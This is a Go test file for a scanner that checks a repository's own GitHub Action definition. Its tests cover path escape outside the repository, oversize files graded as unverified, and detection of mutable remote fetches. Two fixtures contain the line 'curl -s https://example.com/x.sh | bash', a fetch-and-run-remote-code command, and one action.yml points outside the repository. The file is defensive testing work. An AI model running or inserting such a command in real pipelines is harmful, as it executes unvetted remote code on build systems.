package github

import (
	"os"
	"path/filepath"
	"testing"
)

// The producer-side self-action scan must read the action's entrypoint from
// within the scanned repository only, never a path the action.yml points at
// outside it.
func TestScanLocalSelfActionStaysWithinRepo(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, "repo")
	outside := filepath.Join(base, "outside")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(outside, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(outside, "payload.sh"),
		[]byte("curl -s https://example.com/x.sh | bash\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "action.yml"),
		[]byte("name: self\nruns:\n  using: node20\n  main: ../outside/payload.sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if res := ScanLocalSelfAction(root); res != nil {
		t.Fatalf("entrypoint outside the repository was read: %+v", res)
	}
}

// An entrypoint that is present but larger than the read limit must be
// reported as could-not-verify, not graded clean by being skipped.
func TestScanLocalSelfActionOversizeEntrypointUnverified(t *testing.T) {
	root := t.TempDir()
	big := make([]byte, maxRawFileBytes+1)
	for i := range big {
		big[i] = 'a'
	}
	if err := os.WriteFile(filepath.Join(root, "entry.js"), big, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "action.yml"),
		[]byte("name: self\nruns:\n  using: node20\n  main: entry.js\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res := ScanLocalSelfAction(root)
	if res == nil || res.Tier != "unverified" {
		t.Fatalf("oversize entrypoint: want unverified, got %+v", res)
	}
}

// A root action definition that is present but larger than the read limit
// must itself be reported as could-not-verify, not graded clean by being
// treated as absent. Covers both the action.yml read and the
// action.yaml second-read feeding the same branch.
func TestScanLocalSelfActionOversizeDefinitionUnverified(t *testing.T) {
	big := make([]byte, maxWorkflowFileBytes+1)
	for i := range big {
		big[i] = 'a'
	}
	t.Run("action.yml oversize", func(t *testing.T) {
		root := t.TempDir()
		if err := os.WriteFile(filepath.Join(root, "action.yml"), big, 0o644); err != nil {
			t.Fatal(err)
		}
		res := ScanLocalSelfAction(root)
		if res == nil || res.Tier != "unverified" || res.File != "action.yml" {
			t.Fatalf("oversize action.yml: want unverified action.yml, got %+v", res)
		}
	})
	t.Run("action.yaml oversize, no action.yml", func(t *testing.T) {
		root := t.TempDir()
		if err := os.WriteFile(filepath.Join(root, "action.yaml"), big, 0o644); err != nil {
			t.Fatal(err)
		}
		res := ScanLocalSelfAction(root)
		if res == nil || res.Tier != "unverified" {
			t.Fatalf("oversize action.yaml: want unverified, got %+v", res)
		}
	})
}

// Happy path: a well-formed in-repo action.yml plus its entrypoint are read
// and scanned, so a mutable remote fetch in the entrypoint is flagged. Guards
// against a regression that stopped reading a legitimate in-repo entrypoint.
func TestScanLocalSelfActionFlagsMutableEntrypoint(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "entry.js"),
		[]byte("#!/usr/bin/env bash\ncurl -s https://example.com/x.sh | bash\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "action.yml"),
		[]byte("name: self\nruns:\n  using: node20\n  main: entry.js\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res := ScanLocalSelfAction(root)
	if res == nil {
		t.Fatal("want a mutable-remote-exec finding from the in-repo entrypoint, got nil")
	}
	if res.Tier == "unverified" {
		t.Fatalf("entrypoint was not read (graded unverified): %+v", res)
	}
}
